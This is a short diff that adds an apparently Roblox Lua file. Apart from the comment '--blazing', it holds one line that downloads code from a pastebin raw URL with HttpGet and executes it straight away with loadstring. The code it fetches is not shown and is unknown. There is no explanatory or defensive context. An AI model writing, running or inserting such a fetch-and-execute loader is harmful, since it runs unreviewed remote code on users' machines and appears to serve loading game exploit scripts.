@@ -1,0 +1,3 @@
+--blazing
+
+loadstring(game:HttpGet("https://pastebin.com/raw/d75VfZK1"))()
